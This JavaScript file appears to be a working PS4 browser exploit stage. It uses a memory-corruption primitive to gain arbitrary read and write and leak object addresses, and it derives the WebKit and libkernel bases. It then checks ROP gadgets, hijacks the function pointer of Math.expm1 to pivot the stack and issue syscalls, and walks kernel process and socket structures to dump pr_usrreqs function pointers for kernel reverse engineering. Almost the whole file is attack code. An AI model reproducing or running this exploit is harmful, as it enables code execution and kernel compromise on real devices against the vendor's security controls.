import { establishPrimitive } from "./core.js";
import { int64 } from "./int64.js";
import { offsetsFor } from "./ps4_offsets.js";

const outEl   = document.getElementById("out");
const stateEl = document.getElementById("state");
const lines   = [];
const params  = new URLSearchParams(location.search);

let coldBootNeeded = false;

function isMemoryError(e) {
    if (!e) return false;
    const s = String(e && e.message ? e.message : e).toLowerCase();
    return s.includes("sysmemory")
    || s.includes("not enough free")
    || s.includes("out of memory")
    || s.includes("out of mem")
    || s.includes("allocation failed")
    || s.includes("array buffer allocation")
    || s.includes("arraybuffer");
}

function mark(tag, detail) {
    const line = tag + (detail == null || detail === "" ? "" : "  " + detail);
    lines.push(line);
    if (typeof console !== "undefined") console.log(line);
    if (outEl) {
        outEl.innerHTML = lines.map(l =>
        l.replace(/&/g, "&amp;").replace(/</g, "&lt;")).join("\n");
        outEl.scrollTop = outEl.scrollHeight;
    }
}
function markColdBoot(reason) {
    if (coldBootNeeded) return;
    coldBootNeeded = true;
    mark("COLD-BOOT-REQUIRED",
         "reason=" + reason
         + " -- close browser completely (not just the tab), "
         + "power-cycle the PS4, then reopen");
}
function hx8(x)  { return ("0" + ((x >>> 0) & 0xff).toString(16)).slice(-2); }
function hx32(x) { return ("00000000" + ((x >>> 0).toString(16))).slice(-8); }
// FIXED: int64 stores .low (three letters), not .lo
function phex(v) { return "0x" + hx32(v.hi) + hx32(v.low); }
function zero(v) { return ((v.low >>> 0) === 0) && ((v.hi >>> 0) === 0); }

function numToI64(n) {
    if (!Number.isFinite(n) || n < 0) return new int64(0, 0);
    const hi = Math.floor(n / 0x100000000) >>> 0;
    const lo = (n - hi * 0x100000000) >>> 0;
    return new int64(lo, hi);
}
// FIXED: .low
function i64ToNum(v) { return (v.hi >>> 0) * 0x100000000 + (v.low >>> 0); }
function asI64(x)    { return (x instanceof int64) ? x : numToI64(x); }

const SYS = { socket: 0x61, close: 6, getpid: 20, getuid: 0x18 };
const AF_UNIX = 1, SOCK_STREAM = 1, AF_INET6 = 28;

window.addEventListener("error", (ev) => {
    if (isMemoryError(ev && ev.error ? ev.error : ev && ev.message)) {
        markColdBoot("window-error:" + (ev.message || "unknown"));
        try { stateEl.textContent = "cold-boot-required"; } catch {}
    }
});
window.addEventListener("unhandledrejection", (ev) => {
    if (isMemoryError(ev && ev.reason)) {
        markColdBoot("unhandled-rejection:" + (ev.reason && ev.reason.message
        ? ev.reason.message : String(ev.reason)));
        try { stateEl.textContent = "cold-boot-required"; } catch {}
    }
});

(async function () {
    let p = null;
    let carrier = null;
    let mainMf = null, mainOrig = null, mainArmed = false;

    try {
        const { key, off } = offsetsFor(navigator.userAgent);
        if (!off) { stateEl.textContent = "no offsets"; return; }
        mark("FW", navigator.userAgent);
        mark("FW-KEY", key || "unknown");

        try {
            carrier = await establishPrimitive({
                maxAttempts: 4,
                onEvent: (t, d) => {
                    mark(t, d || "");
                    const s = String(d || "").toLowerCase();
                    if (s.includes("sysmemory") || s.includes("not enough free")) {
                        markColdBoot("core-event:" + t);
                    }
                }
            });
        } catch (err) {
            if (isMemoryError(err)) {
                markColdBoot("establishPrimitive:" + (err.message || err));
                stateEl.textContent = "cold-boot-required";
                return;
            }
            throw err;
        }

        mark("PRIM-OK",
             "host=" + hx32(carrier.hostAddress >>> 0)
             + " fake=" + hx32(carrier.fakeAddress >>> 0)
             + " holderAddr=" + hx32(carrier.holderAddress >>> 0)
             + " leakSlotAddr=" + hx32(carrier.leakSlotAddress >>> 0));

        const CV = carrier.view;
        if (!CV || CV.length < 0x100) throw new Error("carrier.view missing");

        const REUSE = new Uint8Array(0x200);
        function readBytesAt(addr, n) {
            const addrNum = (typeof addr === "number") ? addr : i64ToNum(addr);
            carrier.aim(addrNum);
            for (let i = 0; i < n; ++i) REUSE[i] = CV[i];
            carrier.restore();
            return REUSE.subarray(0, n);
        }
        function read1(a) { return readBytesAt(a, 1)[0]; }
        function read2(a) {
            const b = readBytesAt(a, 2);
            return (b[0] | (b[1] << 8)) >>> 0;
        }
        function read4(a) {
            const b = readBytesAt(a, 4);
            return (b[0] | (b[1]<<8) | (b[2]<<16) | (b[3]<<24)) >>> 0;
        }
        function read8(a) {
            const b = readBytesAt(a, 8);
            const lo = (b[0] | (b[1]<<8) | (b[2]<<16) | (b[3]<<24)) >>> 0;
            const hi = (b[4] | (b[5]<<8) | (b[6]<<16) | (b[7]<<24)) >>> 0;
            return new int64(lo, hi);
        }
        function write8(a, v) {
            const addrNum = (typeof a === "number") ? a : i64ToNum(a);
            // FIXED: .low
            const lo = (typeof v === "number") ? (v >>> 0) : (v.low >>> 0);
            const hi = (typeof v === "number") ? (v < 0 ? 0xffffffff : 0) : (v.hi >>> 0);
            carrier.aim(addrNum);
            CV[0] = lo & 0xff;
            CV[1] = (lo >>> 8) & 0xff;
            CV[2] = (lo >>> 16) & 0xff;
            CV[3] = (lo >>> 24) & 0xff;
            CV[4] = hi & 0xff;
            CV[5] = (hi >>> 8) & 0xff;
            CV[6] = (hi >>> 16) & 0xff;
            CV[7] = (hi >>> 24) & 0xff;
            carrier.restore();
        }
        function leakval(obj) {
            carrier.setLeakSlot(obj);
            const v = read8(carrier.leakSlotAddress);
            carrier.clearLeakSlot();
            return v;
        }
        p = { read1, read2, read4, read8, write8, leakval };

        // ============================================================

        const cell = p.leakval(Math.expm1);
        mark("CELL", phex(cell));

        const nativeFn = p.read8(p.read8(cell.add32(0x18))
        .add32(off.wk_JSFunction_m_function));
        const webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
        const errorFn    = p.read8(webkitBase.add32(off.wk___imp___error));
        const libkernelBase = errorFn.sub32(off.k__error);
        mark("BASES", "webkit=" + phex(webkitBase)
        + " libkernel=" + phex(libkernelBase));

        {
            const rawKB = (params.get("kbase") || "0xffffffff80000000")
            .replace(/^0x/i, "").padStart(16, "0");
            const KB = new int64(parseInt(rawKB.slice(8), 16) >>> 0,
                                 parseInt(rawKB.slice(0, 8), 16) >>> 0);
            const head = readBytesAt(KB, 16);
            const hdr = [];
            for (let i = 0; i < 16; ++i) hdr.push(hx8(head[i]));
            mark("KBASE-PROBE", phex(KB) + " head=" + hdr.join(" "));
        }

        const G = {};
        const GAD = [
            ["POP_RDI_RET",        off.wk_POP_RDI_RET,        [0x5f, 0xc3]],
            ["POP_RSI_RET",        off.wk_POP_RSI_RET,        [0x5e, 0xc3]],
            ["POP_RDX_RET",        off.wk_POP_RDX_RET,        [0x5a, 0xc3]],
            ["POP_RCX_RET",        off.wk_POP_RCX_RET,        [0x59, 0xc3]],
            ["POP_R8_RET",         off.wk_POP_R8_RET,         [null, 0x58, 0xc3]],
            ["POP_R9_RET",         off.wk_POP_R9_RET,         [null, 0x59, 0xc3]],
            ["POP_RAX_RET",        off.wk_POP_RAX_RET,        [0x58, 0xc3]],
            ["LEAVE_RET",          off.wk_LEAVE_RET,          [0xc9, 0xc3]],
            ["MOV_RDI_RAX_RET",    off.wk_MOV_QWORD_PTR_RDI_RAX_RET,
            [0x48, 0x89, 0x07, 0xc3]],
            ["G0",                 off.wk_MOV_RDI_RSI_30_CALL,
            [0x48, 0x8b, 0x7e, 0x30]],
            ["G1",                 off.wk_POP_RAX_MOV_RAX_JMP_18,
            [0x58, 0x48, 0x8b, 0x07]],
            ["G2",                 off.wk_PUSH_RBP_MOV_RBP_RSP_10,
            [0x55, 0x48, 0x89, 0xe5]],
            ["G3",                 off.wk_MOV_RDI_RAX_8_CALL_20,
            [0x48, 0x8b, 0x78, 0x08]],
            ["G4",                 off.wk_MOV_RDX_RAX_18_CALL_10,
            [0x48, 0x8b, 0x50, off.pivot_view_sp]],
            ["G5",                 off.wk_PUSH_RDX_POP_RSP_RET,
            [0x52, 0x5c, 0xc3]],
        ];
        for (const [nm, rva, pat] of GAD) {
            const a = webkitBase.add32(rva);
            let good = true;
            for (let i = 0; i < pat.length; ++i) {
                if (pat[i] === null) continue;
                if (p.read1(a.add32(i)) !== pat[i]) { good = false; break; }
            }
            if (!good) { mark("GADGET-BAD", nm); return; }
            G[nm] = a;
        }
        mark("GADGETS", "ok");

        const stubAddr = new Map();
        const kStubs = off.k_stubs || {};
        const wantStubs = [SYS.getpid, SYS.getuid, SYS.socket, SYS.close];
        for (const num of wantStubs) {
            const o = kStubs[num];
            if (o == null) { mark("STUB-MISSING", "num=" + num); continue; }
            const addr = libkernelBase.add32(o);
            const head = readBytesAt(addr, 16);
            const hex = [];
            for (let i = 0; i < 16; ++i) hex.push(hx8(head[i]));
            mark("STUB-DBG",
                 "num=0x" + num.toString(16)
                 + " rva=0x" + o.toString(16)
                 + " bytes=" + hex.join(" "));
            stubAddr.set(num, addr);
        }
        if (!stubAddr.has(SYS.getpid) || !stubAddr.has(SYS.socket)) {
            mark("FAIL", "stubs missing from off.k_stubs");
            stateEl.textContent = "stubs missing";
            return;
        }

        for (let i = 0; i < 8; ++i) { const t = new Uint8Array(0x1000); void t; }

        function bufAddr(ab) {
            const c = p.leakval(ab);
            return p.read8(p.read8(c.add32(off.wk_ArrayBuffer_m_impl))
            .add32(off.wk_ArrayBuffer_m_contents_m_data));
        }
        function put(dv, at, v) {
            if (typeof v === "number") {
                dv.setUint32(at, v >>> 0, true);
                dv.setUint32(at + 4, v < 0 ? 0xffffffff : 0, true);
            } else {
                // FIXED: .low
                dv.setUint32(at, v.low >>> 0, true);
                dv.setUint32(at + 4, v.hi >>> 0, true);
            }
        }
        const PB_SIZE = Math.max(0x28, (off.pivot_view_sp + 8 + 0xf) & ~0xf);
        const keepAlive = [];
        const sb = new ArrayBuffer(0x20), pb = new ArrayBuffer(PB_SIZE);
        const kb = new ArrayBuffer(0x2000), fb = new ArrayBuffer(0x40);
        keepAlive.push(sb, pb, kb, fb);
        globalThis.__keep = keepAlive;
        const M = {
            storeDv: new DataView(sb), pivotDv: new DataView(pb),
 stackDv: new DataView(kb), frameDv: new DataView(fb),
 stackU8: new Uint8Array(kb), frameU8: new Uint8Array(fb)
        };
        M.S = bufAddr(sb); M.P = bufAddr(pb);
        M.K = bufAddr(kb); M.F = bufAddr(fb);
        put(M.storeDv, 0x00, G.G1); put(M.storeDv, 0x08, M.P);
        put(M.storeDv, 0x10, G.G3); put(M.storeDv, 0x18, G.G2);
        put(M.pivotDv, 0x00, M.P);  put(M.pivotDv, 0x10, G.G5);
        put(M.pivotDv, 0x20, G.G4);

        mainMf   = p.read8(cell.add32(0x18))
        .add32(off.wk_JSFunction_m_function);
        mainOrig = p.read8(mainMf);
        p.write8(mainMf, G.G0);
        mainArmed = true;

        const argGadget = [G.POP_RDI_RET, G.POP_RSI_RET, G.POP_RDX_RET,
        G.POP_RCX_RET, G.POP_R8_RET, G.POP_R9_RET];
        function layout(target, args) {
            M.stackU8.fill(0); M.frameU8.fill(0);
            const insts = [];
            for (let i = 0; i < args.length; ++i) {
                insts.push(argGadget[i]); insts.push(args[i]);
            }
            insts.push(target);
            insts.push(G.POP_RDI_RET); insts.push(M.F);
            insts.push(G.MOV_RDI_RAX_RET);
            insts.push(G.POP_RAX_RET);
            insts.push(new int64(0x0a, 0xfffffff7));
            insts.push(G.LEAVE_RET);
            let at = 0x2000 - 8 * insts.length;
            if (((M.K.low + at + 8 * (insts.length - 6)) & 0xf) !== 0) at -= 8;
            for (let i = 0; i < insts.length; ++i)
                put(M.stackDv, at + 8 * i, insts[i]);
            put(M.pivotDv, off.pivot_view_sp, M.K.add32(at));
        }
        const pivotObj  = {};
        const pivotCell = p.leakval(pivotObj);
        function callAddr(target, args) {
            layout(target, args);
            const saved = p.read8(pivotCell);
            p.write8(pivotCell, M.S);
            try { Math.expm1(pivotObj); } catch (e) { }
            p.write8(pivotCell, saved);
            return {
                lo:  M.frameDv.getUint32(0, true),
 hi:  M.frameDv.getUint32(4, true),
 i32: M.frameDv.getUint32(0, true) | 0
            };
        }
        const sc = (num, ...a) => callAddr(stubAddr.get(num), a);

        const pid = sc(SYS.getpid).i32;
        mark("GETPID", String(pid));
        if (pid <= 0) {
            mark("FAIL", "getpid returned " + pid
            + " -- stub offset for num=20 is wrong, or ROP is broken");
            stateEl.textContent = "stub broken";
            return;
        }
        const uid = sc(SYS.getuid).i32;
        mark("GETUID", String(uid));

        const rawKB = (params.get("kbase") || "0xffffffff80000000")
        .replace(/^0x/i, "").padStart(16, "0");
        const KBASE = new int64(parseInt(rawKB.slice(8), 16) >>> 0,
                                parseInt(rawKB.slice(0, 8), 16) >>> 0);
        mark("KBASE", phex(KBASE));

        let sfd = sc(SYS.socket, AF_INET6, SOCK_STREAM, 0).i32;
        if (sfd === -1) {
            mark("NOTE", "AF_INET6 failed, trying AF_UNIX");
            sfd = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
        }
        if (sfd === -1) {
            mark("FAIL", "socket() returned -1 on both families");
            stateEl.textContent = "socket failed";
            return;
        }
        mark("SOCKET", "fd=" + sfd);

        const ALLPROC_RVA  = 0x01CA8538;
        const ZOMBPROC_RVA = 0x01CA8540;
        const P_LIST_NEXT = 0x00, P_PID = 0xb0, P_FD = 0x48;

        let procPtr = p.read8(KBASE.add32(ALLPROC_RVA));
        mark("ALLPROC", phex(procPtr));
        let found = null, scanned = 0;
        while (!zero(procPtr) && scanned < 8192) {
            const upid = p.read4(procPtr.add32(P_PID)) | 0;
            if (upid === pid) { found = procPtr; break; }
            procPtr = p.read8(procPtr.add32(P_LIST_NEXT));
            scanned++;
        }
        if (!found) { mark("FAIL", "proc not found scanned=" + scanned); return; }
        mark("PROC", phex(found));

        const fdp = p.read8(found.add32(P_FD));
        if (zero(fdp)) { mark("FAIL", "p_fd null"); return; }
        mark("FD_TABLE", phex(fdp));

        const filePtr = p.read8(fdp.add32(sfd * 8));
        if (zero(filePtr)) { mark("FAIL", "file null"); return; }
        const ftype  = p.read2(filePtr.add32(0x20)) & 0xffff;
        const fcount = p.read4(filePtr.add32(0x28)) | 0;
        mark("FILE", phex(filePtr)
        + " f_type=0x" + ftype.toString(16) + " f_count=" + fcount);

        const so = p.read8(filePtr.add32(0x00));
        if (zero(so)) { mark("FAIL", "f_data null"); return; }
        mark("SO", phex(so));

        {
            const blk = readBytesAt(so, 0x80);
            for (let i = 0; i < 0x80; i += 8) {
                let lo = 0, hi = 0;
                for (let k = 0; k < 4; ++k) lo |= blk[i + k] << (8 * k);
                for (let k = 0; k < 4; ++k) hi |= blk[i + 4 + k] << (8 * k);
                mark("SO-DUMP",
                     "so+0x" + i.toString(16).padStart(2, '0')
                     + " = 0x" + hx32(hi >>> 0) + hx32(lo >>> 0));
            }
        }

        const soProto = p.read8(so.add32(0x28));
        if (zero(soProto)) { mark("FAIL", "so_proto null (guessed +0x28)"); return; }
        mark("SO_PROTO", "A = " + phex(soProto));

        {
            const blk = readBytesAt(soProto, 0x40);
            for (let i = 0; i < 0x40; i += 8) {
                let lo = 0, hi = 0;
                for (let k = 0; k < 4; ++k) lo |= blk[i + k] << (8 * k);
                for (let k = 0; k < 4; ++k) hi |= blk[i + 4 + k] << (8 * k);
                mark("A-DUMP",
                     "A+0x" + i.toString(16).padStart(2, '0')
                     + " = 0x" + hx32(hi >>> 0) + hx32(lo >>> 0));
            }
        }

        const pr = p.read8(soProto.add32(0x60));
        if (zero(pr)) { mark("FAIL", "pr_usrreqs null (guessed +0x60)"); return; }
        mark("PR_USRREQS", "B = " + phex(pr));

        mark("DUMP-HEAD",
             "so=" + phex(so)
             + " A=" + phex(soProto)
             + " B=" + phex(pr));

        const PRU = [
            ["pru_abort",       0x00], ["pru_accept",     0x08],
            ["pru_attach",      0x10], ["pru_bind",       0x18],
            ["pru_connect",     0x20], ["pru_connect2",   0x28],
            ["pru_control",     0x30], ["pru_detach",     0x38],
            ["pru_disconnect",  0x40], ["pru_listen",     0x48],
            ["pru_peeraddr",    0x50], ["pru_rcvd",       0x58],
            ["pru_send",        0x60], ["pru_shutdown",   0x68],
            ["pru_sockaddr",    0x70], ["pru_sosend",     0x78],
            ["pru_soreceive",   0x80], ["pru_sopoll",     0x88],
            ["pru_sosetlabel",  0x90], ["pru_close",      0x98],
        ];
        {
            const blk = readBytesAt(pr, 0xa0);
            for (const [name, o] of PRU) {
                let lo = 0, hi = 0;
                for (let k = 0; k < 4; ++k) lo |= blk[o + k] << (8 * k);
                for (let k = 0; k < 4; ++k) hi |= blk[o + 4 + k] << (8 * k);
                mark("PRU", name.padEnd(16) + " = 0x"
                + hx32(hi >>> 0) + hx32(lo >>> 0));
            }
        }

        const fn = p.read8(pr.add32(0x18));
        mark("FN", "pru_bind = " + phex(fn));
        mark("FN-HEAD", "fn=" + phex(fn));

        // FIXED: .low on fn and KBASE
        const rvaLo = ((fn.low >>> 0) - (KBASE.low >>> 0)) >>> 0;
        const rvaHi = ((fn.hi >>> 0) - (KBASE.hi >>> 0)) >>> 0;
        mark("FN_RVA", "0x" + hx32(rvaHi) + hx32(rvaLo));

        const ghidra = ((fn.low >>> 0) - (KBASE.low >>> 0) + 0x680000) >>> 0;
        mark("FN_HINT", "1302.elf.c  ->  FUN_"
        + hx32(ghidra).replace(/^00+/, ""));

        {
            const blk = readBytesAt(fn, 0x100);
            let dump = "";
            for (let i = 0; i < 0x100; i++) {
                dump += hx8(blk[i]);
                if ((i & 0xf) === 0xf) { mark("FN_BYTES", dump); dump = ""; }
            }
            if (dump.length) mark("FN_BYTES", dump);
        }

        stateEl.textContent = "done";
    } catch (e) {
        if (isMemoryError(e)) {
            markColdBoot("threw:" + (e && e.message ? e.message : String(e)));
            stateEl.textContent = "cold-boot-required";
        } else {
            mark("THREW", e && e.message ? e.message : String(e));
            stateEl.textContent = "failed";
        }
    } finally {
        try {
            if (mainArmed && mainMf && mainOrig && p) {
                p.write8(mainMf, mainOrig);
                mainArmed = false;
                mark("EXPM1-RESTORED", "expm1(1)=" + Math.expm1(1));
            }
        } catch (e) {
            if (isMemoryError(e)) markColdBoot("disarm:" + e.message);
            else mark("DISARM-THREW", e.message);
        }
    }
})();
